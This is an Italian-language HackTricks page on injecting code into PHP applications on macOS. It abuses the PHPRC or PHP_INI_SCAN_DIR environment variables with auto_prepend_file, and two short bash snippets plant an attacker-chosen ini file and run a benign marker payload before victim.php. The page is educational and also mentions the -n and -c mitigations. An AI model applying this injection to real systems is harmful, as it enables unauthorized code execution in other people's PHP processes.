# Iniezione nelle applicazioni PHP di macOS

{{#include ../../../banners/hacktricks-training.md}}

## `PHPRC` / `PHP_INI_SCAN_DIR` e `auto_prepend_file`

PHP CLI e CGI leggono la configurazione a ogni invocazione. `PHPRC` può selezionare un `php.ini` leggibile dall’attaccante, mentre `PHP_INI_SCAN_DIR` può reindirizzare la directory analizzata alla ricerca di file `.ini` aggiuntivi. La direttiva `auto_prepend_file` fa analizzare a PHP un file prima dello script richiesto, quindi questa combinazione consente l’esecuzione di codice all’avvio.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```
Un'alternativa è una directory contenente un file `.ini`:
```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```
L'opzione `-n` ignora `php.ini`; un percorso `-c` esplicito e trusted ha la precedenza su `PHPRC`. Ricorda che un server SAPI long-lived normalmente legge la configurazione all'avvio del web server, mentre CLI e CGI lo fanno a ogni invocazione.<sup>[[1]](#references)</sup>

## References

- [1] [File di configurazione di PHP](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
{{#include ../../../banners/hacktricks-training.md}}
